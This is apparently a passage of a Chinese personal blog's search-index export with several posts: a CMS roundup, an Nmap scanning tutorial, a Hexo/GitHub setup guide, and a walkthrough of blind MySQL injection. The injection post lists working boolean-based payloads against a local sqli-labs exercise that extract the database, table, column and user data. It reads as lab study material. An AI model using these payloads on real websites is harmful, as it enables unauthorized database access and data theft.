phpcms－一个综合的网站管理系统，由PHP+MYSQL构架全站生成html，能够快速高效地应用于LINUX和WINDOWS服务器平台，是目前中国LINUX环境下最佳的网站管理应用解决方案之一。据传被酷6收购。 官方：http://www.phpcms.cn 3. 帝国网站管理系统－Ecms全称为＂帝国网站管理系统＂，英文译为＂Empire CMS＂简称＂Ecms＂.Ecms是基于B/S结构，且功能强大而易用的网站管理系统．是一个经过完善设计的适用于Linux/windows /Unix等环境下高效的网站解决方案。 官方：http://www.phome.net 4. php168－PHP168整站系统，代码全部开源，可方便的进行二次开发，功能模块可以自由安装与删除，个人用户免费使用。系统频道模块很多，适合作个人门户网站。较多页面没有生成静态页。如果你想建站，就义无反顾的选择它吧！！！ 官方：http://www.php168.com 5. HBcms一个以PHP官方推荐的PEAR+SMARTY技术架构的cms，比较容易上手，适合没经验的新人做网站。没有下载，分类信息等模块，适合做文章为主的网站。全站生成静态页，默认附带了几套模板，可以方便的更换模板。个人企业都免费，无需授权。 官方：http://www.hbcms.com/ 6. SupSite－一款将论坛资源自动转换成门户网站的php程序系统，使用SupeSite，并利用你现有的论坛，你将自动拥有一个功能完备的，资源丰富的站点系统；由论坛变成网站，一切都是自动完成，你不需要任何干涉。让你轻轻松松实现建立网站的目的。 官方：http://www.supsite.net 7. 曼波－MAMBO一个国外的CMS系统，功能很强大，支持添加很多组件，模块;拥有丰富的模板.Mambo是一个网站内容管理系统(CMS)，它是网站的后台引擎，使网站内容的创建、管理和共享更加简易。Mambo十分强大，但官方网站也承认，它不是典型的“门户”网站解决方案。 官方：http://www.mamboserver.com 8. Joomla!是一套在国外相当知名的内容管理系统，2007年开源cms第一名！Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，可以在 Linux、Windows、MacOSX等各种不同的平台上执行。操作接口除了美观之外，也花了很多心力在设计这些接口的简易操作性。但初次使用者，需要花一点时间学习一下操作的方式，才能运用自如。。 官方：http://www.joomla.org/ 9. Drupal－Drupal是一个强大的软件，它可以让个人或社区使用者很容易地发表、管理并组织一个网站里大量且多样的内容。已经有许多个人和组织采用 Drupal来建立各种不同的网站。Drupal是一套采用GPL授权的开放源码软件，是由数以千计的使用者和开发人员所共同维护和开发的。 官方：http://drupal.org/ 10. WordPress- 是一款基于PHP和MySQL的Blog软件，但是它也可以当作简单的cms系统来用。通过它可以快速而简便的搭建属于你自己的Blog（网站）平台。简而言之,这个Wordpress就相当于咱们用来搭建论坛的那些程序,比如用在自留地上的雷傲,还有别的比如PHPBB等等…Wordpress因为它的安装简单和可扩展性好几乎已经成了独立搭建Blog平台的第一选择。Wordpress还有一个MU就是多用户的版本,支持多用户的Blog系统。 官方：http://wordpress.org/ .Net系列的CMS系统1.动网新闻(asp.net)最新的4.X也出来了，也是DLL的，不过系统是.NET的，不过我个人不趋向使用DLL的系统，运行速度快，效率高，安全做足。 不过以前3.X的没有Dll，感觉也蛮好的，缺点就是风格改起来不容易。现在加密了，反而能更快上手，不过这样可以定制的地方就少了。 目前风讯和动易都推出了基于.net的CMS系统 2.netcmsNetCMS是基于ASP.NET2.0开发的网站内容管理系统，采用sql server数据库，程序完全开源，没有任何文件加密, 不需要注册任何组件。在完全遵守NetCMS最终用户授权协议的基础上，非商业用途免费。 推荐理由：可以研究其设计思路、程序架构、编码风格和模板引擎逻辑等等。 官方网站：http://www.aspxcms.com/ 3.闪睿企业网站管理系统闪睿是一套针对企业的网站管理系统，采用 ASP.NET2.0 编写，支持 Access，MSSql 数据库。 * 1国际化编码，可同时支持任意多种语言 * 2针对搜索引擎优化，静态化页面，客户更容易找到您。 * 3模板制作简单，灵活，最少只需2页html。 * 4完善的后台管理,企业网站管理模块应有尽有，可无限扩展，随意增删改。 * 5优秀的系统架构，数据结构，使用页面高速缓存，站点访问速度快。 * 6专业精致的界面设计，无论是默认模板还是管理后台。 * 7高可用性设计，前台后台操作简单方便。 * 8支持Access和MSSql数据库。 * 9强劲的数据验证机制，保障系统安全。 缺点是不开源。 推荐理由：可以研究其设计思路、程序架构、模板引擎逻辑，另外他的后台管理界面风格我个人比较喜欢:) 官方地址：http://www.shanrui.net/L1U1397.aspx 演示站点：http://www.shanrui.net/L2U1397.aspx 免费版和商业版的区别： http://www.shanrui.net/L1U1397.aspx 4.锐商企业CMS锐商企业CMS作为面向企业的CMS产品，结合企业用户的特点，设计了，包括编译级主题模板，JIT 渲染引擎，网站前端编辑系统（FrEE），多国语言支持，W3C标准的支持与内建的SEO支持等独到的功能。基于asp.net+sql server，可惜不开源。 推荐理由：前端编辑系统很不错 官方网站：http://comsharp.com/ 演示站点：http://demo1.comsharp.com/ ～ http://demo10.comsharp.com/ 5.SiteServer CMSSiteServer CMS 是基于微软 .NET 平台开发的网站内容管理系统，它集成了内容发布管理、多站点集成、信息采集、搜索引擎优化、全文检索等多项强大功能，能够生成纯静态页面，独创的 STL 模版语言，通过Dreamweaver可视化插件能够轻易编辑模版样式。 推荐理由：STL模版语言 官方网站：http://www.siteserver.cn 个人免费版下载：http://www.siteserver.cn/download/contents/67.html JSP系列的CMS系统大概有这些： 1.Netark CMS2.方正翔宇CMS3.开源的Magnolia4.Magnolia CMS额外补充国外CMS：WordPress，Joomla，Drupal国内CMS：Dedecms商城：Magento，OpenCart，ZenCart]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Nmap使用]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F30%2FNmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[nmap这个渗透工具一般用在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持一.nmap的安装和扫描的基本概念首先对于nmap的安装，可以自行百度，当然kali linux是内置了nmap的，只要在命令行下输入nmap即可使用，参数-version可以查看当前nmap的版本然后对于扫描简单的来说其实就是四个动作 1.统一沟通语言 （TCP/IP协议） 2.发出刺激 （ICMP报文头） 3.受到刺激的反馈 （ICMP的反馈） 4通过比对刺激和反馈完成扫描 二.如何找到网络上的设备nmap的基本输入： 将你要扫描的设备地址告诉nmap可以通过下面的方法实现 统一格式：nmap [扫描类型] [设置] {设备地址} 其中设备地址（主机名，IP地址，网段等）可以通过以下方法 1.-iL &lt;文件名&gt; 通过文件输入地址 2.-iR &lt;IP地址数目&gt; 3.–exclude :排出文件中的地址 4.直接输入IP或网段（最常用） 上面是nmap两个简单扫描例子，仅反馈了一些简单的信息，但是对于其他的数据收集，nmap里面有详细的参数可以实现，下面将开始讲解一些常用参数的使用： 扫描参数： 1.-sL 不做扫描，仅完成DNS解析和网址的转换 2.-sP 默认发ICMP echo请求和TCP的ACK请求（80端口） 3.-PN 不用ping 4.-Ps &lt;端口号列表&gt; 发TCP协议SYN标记的空包（80端口） 5.-PA &lt;端口号列表&gt; 发TCP协议ACK标记的空包（80端口） 6.-PU &lt;端口号列表&gt; （31338端口） 7.-PE -PP -PM 8.-PO &lt;协议列表&gt; 9.-PR （ARP ping） 设置参数： –traceroute-n（不要做DNS解析）-R（DNS解析所有的地址，默认不解析不在线的IP）-system-dns（使用系统DNS）–dns-servers [,[,…]](使用其他DNS) 三.端口扫描概要1.端口扫描： -p &lt;端口号列表&gt; 2.端口状态： 1.Open，端口开启，有程序监听此端口 2.Closed，端口关闭，数据能到达主机，但是没有程序监听此端口。 3.Filtered，数据未能到达主机。 4.Unfiltered，数据能到达主机，但是Nmap无法判断端口开启还是关闭。 5.Open|filtered，端口没有返回值，主要出现在UDP，IP，FIN，NULL和Xmas扫描 6.Closed|filtered，只出现在IP ID idle 扫描。 四.端口扫面技术和算法1.TCP标志位扫描 -sS TCP SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快） -sT TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同,耗时长） 2.UDP扫描 -sU （使用-sUV能增加扫描的准确性） 没有UDP端口开放 3.协议扫描 -sO 获取服务器支持哪些协议 常用的扫描一般就上面几种 五.优化nmap的性能-F (快速扫描100个常用端口) 六.服务和应用程序版本的识别有时候nmap探测出来的服务和版本信息并不是非常准确，不过我们可以通过加参数的方式使其精确 1.-sV：探测开放端口的服务和版本信息2.–version-intensity&lt;0-9&gt;：设置探测深度3.–version-light：相当于0-24.–version-all：相当于0-95.–version-trace：显示版本扫描详情(用于调试) 七.远程操作系统的识别1.-O：启动操作系统识别。2.–osscan-limit：限定只识别有端口开放的主机，提高-O和-A参数时的扫描速度。3.–osscan-guest：给NMAP建议的操作系统。类似于sqlmap的参数。4.–max-os-tries &lt;次数&gt;：设置重试次数（默认为5），提高准确性或者提高速度。]]></content>
      <categories>
        <category>渗透工具使用</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL注入]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F29%2FMySQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1：判断当前数据库的长度利用二分法http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 //不显示任何数据 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 //正常显示 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 //不显示任何数据 大于7正常显示，大于8不显示，说明大于7而不大于8， 所以可知当前数据库长度为 8 2：判断当前数据库的字符和上面的方法一样，利用二分法依次判断//判断数据库的第一个字符 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),1,1))&gt;100//判断数据库的第二个字符 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),2,1))&gt;100 ………..由此可以判断出当前数据库为 security 3：判断当前数据库中的表http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from admin) //猜测当前数据库中是否存在admin表 1：判断当前数据库中表的个数// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(table\_name) from information\_schema.tables where table_schema=database())&gt;5 # 2：判断每个表的长度//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table\_name from information\_schema.tables where table_schema=database() limit 0,1))=6 判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table\_name from information\_schema.tables where table_schema=database() limit 1,1))=6 3：判断每个表的每个字符的ascii值//判断第一个表的第一个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 # 判断第一个表的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 # ………由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断 4. 判断表中的字段http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin) //如果已经证实了存在admin表，那么猜测是否存在username字段 1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column\_name) from information\_schema.columns where table_name=&#39;users&#39;)&gt;5 # 2：判断字段的长度//判断第一个字段的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5 //判断第二个字段的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 1,1))&gt;5 3：判断字段的ascii值//判断第一个字段的第一个字符的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;100 //判断第一个字段的第二个字符的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1))&gt;100 ………..由此可判断出users表中存在 id、username、password 字段 5.判断字段中的数据我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据 1: 判断数据的长度// 判断id字段的第一个数据的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 0,1))&gt;5 // 判断id字段的第二个数据的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 1,1))&gt;5 2：判断数据的ascii值// 判断id字段的第一个数据的第一个字符的ascii值http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),1,1))&gt;100 // 判断id字段的第一个数据的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),2,1))&gt;100]]></content>
      <categories>
        <category>Web攻击-注入</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[博客搭建]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F28%2F%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo搭建步骤1. 安装Git2. 安装nodejs安装完后，安全npmnode -vnpm -v3. 安装hexo前面git和nodejs安装好后，就可以安装hexo了，先创建一个文件夹，然后cd到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。npm install -g hexo-cli hexo -v查看版本 接下来初始化一下hexo hexo init myblog myblog可以自己取名字 cd myblog //进入这个myblog文件夹 新建完成后，指定文件夹目录下有： node_modules: 依赖包 public：存放生成的页面 scaffolds：生成文章的一些模板 source：用来存放你的文章 themes：主题 ** _config.yml: 博客的配置文件** hexo server 打开hexo的服务，在浏览器输入localhost:4000就可以看到生成的博客。 使用ctrl+c可以把服务关掉。 4. GitHub创建个人仓库有一个GitHub账户 注册完登录后，在GitHub.com中看到一个New repository，新建仓库 创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名。 点击create repository。 5. 生成SSH添加到GitHub回到你的git bash中， git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。 可以用以下两条，检查一下你有没有输对 git config user.name git config user.email 然后创建SSH,一路回车 ssh-keygen -t rsa -C &quot;youremail&quot; 它会告诉你已经生成了.ssh的文件夹。找到这个文件夹。 ssh，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。 而后在GitHub的setting中，找到SSH keys的设置选项，点击New SSH key 把你的id_rsa.pub里面的信息复制进去。 在gitbash中，查看是否成功 ssh -T git@github.com 6. 将hexo部署到GitHub将hexo和GitHub关联起来，将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，到最后，修改为 deploy: type: git repo: https://github.com/githubName/githubName.github.io.git（githubName就是你的GitHub账户） branch: master 先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。 npm install hexo-deployer-git --save 然后 hexo clean hexo generate hexo deploy 其中 hexo clean清除了你之前生成的东西，也可以不加。 hexo generate 顾名思义，生成静态文章，可以用 hexo g缩写 hexo deploy 部署文章，可以用hexo d缩写 注意deploy时可能要你输入username和password。 得到下图就说明部署成功了，过一会儿就可以在http://yourname.github.io博客]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
</search>
